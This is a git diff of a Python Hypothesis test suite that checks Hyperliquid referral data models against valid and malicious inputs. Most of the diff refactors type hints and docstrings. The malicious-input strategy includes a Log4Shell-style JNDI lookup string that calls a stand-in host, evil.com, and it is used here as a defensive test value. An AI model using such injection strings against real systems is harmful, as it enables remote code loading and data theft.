@@ -1,7 +1,7 @@
 """Property-based tests for Hyperliquid raw referral models.
 
 These tests validate critical security boundary models that process external referral data.
-The models tested here are essential for referral program tracking, reward calculations, and user referral relationships.
+The models tested here are essential for referral tracking, rewards, and user relationships.
 
 SECURITY CRITICAL: These raw models protect against:
 - Malicious referral data that could manipulate reward calculations and user relationships
@@ -34,13 +34,33 @@ from cyberdelta.exceptions.field_validation import TypeFieldError
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR REFERRAL MODEL TESTING
 # =============================================================================
 
 
+def _create_ethereum_address(hex_part: str) -> str:
+    """Create Ethereum address with 0x prefix.
+
+    Args:
+        hex_part: Hex string without prefix.
+
+    Returns:
+        Ethereum address with 0x prefix.
+    """
+    return f"0x{hex_part}"
+
+
 def ethereum_address_strategy() -> SearchStrategy[str]:
-    """Generate valid Ethereum addresses."""
+    """Generate valid Ethereum addresses.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Known valid addresses
         st.sampled_from([
@@ -51,14 +71,18 @@ def ethereum_address_strategy() -> SearchStrategy[str]:
         ]),
         # Generated addresses
         st.builds(
-            lambda hex_part: f"0x{hex_part}",
+            _create_ethereum_address,
             st.text(min_size=40, max_size=40, alphabet=string.hexdigits),
         ),
     ])
 
 
 def referral_code_strategy() -> SearchStrategy[str]:
-    """Generate valid referral codes."""
+    """Generate valid referral codes.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Common referral code patterns
         st.sampled_from([
@@ -87,7 +111,11 @@ def referral_code_strategy() -> SearchStrategy[str]:
 
 
 def financial_decimal_string_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for financial amounts."""
+    """Generate valid decimal strings for financial amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Normal decimal values
         st.decimals(
@@ -112,18 +140,30 @@ def financial_decimal_string_strategy() -> SearchStrategy[str]:
 
 
 def timestamp_strategy() -> SearchStrategy[int]:
-    """Generate valid timestamp values."""
+    """Generate valid timestamp values.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=0, max_value=2**63 - 1)
 
 
 def stage_strategy() -> SearchStrategy[str]:
-    """Generate valid referrer stages."""
+    """Generate valid referrer stages.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["ready", "pending", "active", "inactive", "suspended"])
 
 
 @st.composite
 def valid_referred_by_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid referred by data."""
+    """Generate valid referred by data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "referrer": draw(ethereum_address_strategy()),
         "code": draw(referral_code_strategy()),
@@ -132,7 +172,11 @@ def valid_referred_by_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_referral_state_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid referral state data."""
+    """Generate valid referral state data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "cumVlm": draw(financial_decimal_string_strategy()),
         "cumRewardedFeesSinceReferred": draw(financial_decimal_string_strategy()),
@@ -144,7 +188,11 @@ def valid_referral_state_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_referrer_data_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid referrer data."""
+    """Generate valid referrer data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "code": draw(referral_code_strategy()),
         "referralStates": draw(st.lists(valid_referral_state_data(), min_size=0, max_size=10)),
@@ -153,7 +201,11 @@ def valid_referrer_data_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_referrer_state_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid referrer state data."""
+    """Generate valid referrer state data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "stage": draw(stage_strategy()),
         "data": draw(valid_referrer_data_data()),
@@ -162,7 +214,11 @@ def valid_referrer_state_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_referral_response_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid referral response data."""
+    """Generate valid referral response data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "referredBy": draw(valid_referred_by_data()),
         "cumVlm": draw(financial_decimal_string_strategy()),
@@ -176,8 +232,12 @@ def valid_referral_response_data(draw: st.DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_referral_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for referral security testing."""
+def malicious_referral_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for referral security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Referral manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-referrals}"),
@@ -236,7 +296,7 @@ class TestHyperliquidRawReferredByProperties:
     def test_referred_by_validation_success_properties(
         self, referred_by_data: dict[str, Any]
     ) -> None:
-        """Property: Valid referred by data should always create valid HyperliquidRawReferredBy objects."""
+        """Property: Valid referred by data should create valid HyperliquidRawReferredBy."""
         # Skip invalid data
         try:
             assume(
@@ -269,10 +329,10 @@ class TestHyperliquidRawReferredByProperties:
         malicious_value=malicious_referral_strategy(),
     )
     def test_referred_by_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Referred by model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Referred by model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
             "code": "TESTNET",
         }
@@ -309,8 +369,7 @@ class TestHyperliquidRawReferredByProperties:
 
         # Check if address is valid Ethereum format
         is_valid = (
-            isinstance(referrer_address, str)
-            and referrer_address.strip()
+            referrer_address.strip()
             and referrer_address.startswith("0x")
             and len(referrer_address) == 42
             and all(c in string.hexdigits for c in referrer_address[2:])
@@ -360,7 +419,7 @@ class TestHyperliquidRawReferralStateProperties:
     def test_referral_state_validation_success_properties(
         self, referral_state_data: dict[str, Any]
     ) -> None:
-        """Property: Valid referral state data should always create valid HyperliquidRawReferralState objects."""
+        """Property: Valid referral state data should create valid objects."""
         # Skip invalid data
         try:
             # Validate decimal fields
@@ -406,10 +465,10 @@ class TestHyperliquidRawReferralStateProperties:
         malicious_value=malicious_referral_strategy(),
     )
     def test_referral_state_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Referral state model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Referral state model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "cumVlm": "960652.017122",
             "cumRewardedFeesSinceReferred": "196.838825",
             "cumFeesRewardedToReferrer": "19.683748",
@@ -507,7 +566,7 @@ class TestHyperliquidRawReferrerDataProperties:
     def test_referrer_data_validation_success_properties(
         self, referrer_data_data: dict[str, Any]
     ) -> None:
-        """Property: Valid referrer data should always create valid HyperliquidRawReferrerData objects."""
+        """Property: Valid referrer data should create valid objects."""
         # Skip invalid data
         try:
             assume(
@@ -540,10 +599,10 @@ class TestHyperliquidRawReferrerDataProperties:
         malicious_value=malicious_referral_strategy(),
     )
     def test_referrer_data_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Referrer data model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Referrer data model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "code": "TEST",
             "referralStates": [
                 {
@@ -579,7 +638,7 @@ class TestHyperliquidRawReferrerStateProperties:
     def test_referrer_state_validation_success_properties(
         self, referrer_state_data: dict[str, Any]
     ) -> None:
-        """Property: Valid referrer state data should always create valid HyperliquidRawReferrerState objects."""
+        """Property: Valid referrer state data should create valid objects."""
         # Skip invalid data
         try:
             assume(
@@ -609,10 +668,10 @@ class TestHyperliquidRawReferrerStateProperties:
         malicious_value=malicious_referral_strategy(),
     )
     def test_referrer_state_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Referrer state model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Referrer state model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "stage": "ready",
             "data": {
                 "code": "TEST",
@@ -651,7 +710,7 @@ class TestHyperliquidRawReferralResponseProperties:
     def test_referral_response_validation_success_properties(
         self, referral_response_data: dict[str, Any]
     ) -> None:
-        """Property: Valid referral response data should always create valid HyperliquidRawReferralResponse objects."""
+        """Property: Valid referral response data should create valid objects."""
         # Skip invalid data
         try:
             # Validate nested referred by data
@@ -706,10 +765,10 @@ class TestHyperliquidRawReferralResponseProperties:
         malicious_value=malicious_referral_strategy(),
     )
     def test_referral_response_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Referral response model should reject malicious inputs safely."""
-        base_data = {
+        """Property: Referral response model should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "referredBy": {
                 "referrer": "0x5ac99df645f3414876c816caa18b2d234024b487",
                 "code": "TESTNET",
@@ -760,7 +819,7 @@ class TestHyperliquidRawReferralIntegrationProperties:
         malicious_value=malicious_referral_strategy(),
     )
     def test_referral_models_integration_properties(
-        self, referral_response_data: dict[str, Any], malicious_value: Any
+        self, referral_response_data: dict[str, Any], malicious_value: MaliciousInput
     ) -> None:
         """Property: Referral models should work consistently together."""
         # Skip invalid data
@@ -813,7 +872,7 @@ class TestHyperliquidRawReferralIntegrationProperties:
     def test_referral_models_adversarial_input_properties(
         self, complete_malicious_data: dict[str, Any]
     ) -> None:
-        """Property: All referral models should safely handle complete adversarial input."""
+        """Property: All referral models should handle adversarial input safely."""
         # Property: Complete adversarial input should be safely rejected
         with pytest.raises((ValidationError, TypeError)):
             HyperliquidRawReferralResponse.model_validate(complete_malicious_data)
